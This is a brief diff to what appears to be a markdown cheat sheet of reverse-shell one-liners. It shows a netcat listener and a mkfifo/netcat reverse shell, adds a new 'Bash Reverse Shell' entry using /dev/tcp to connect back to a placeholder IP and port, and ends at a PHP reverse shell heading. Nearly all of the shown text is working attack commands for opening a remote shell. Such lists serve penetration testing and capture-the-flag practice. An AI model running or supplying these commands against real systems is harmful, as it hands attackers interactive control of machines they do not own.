@@ -108,6 +108,12 @@ nc -nvlp PORT
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
 ```
 
+Bash Reverse Shell
+
+```bash
+bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
+```
+
 PHP Reverse Shell
 
 ```php
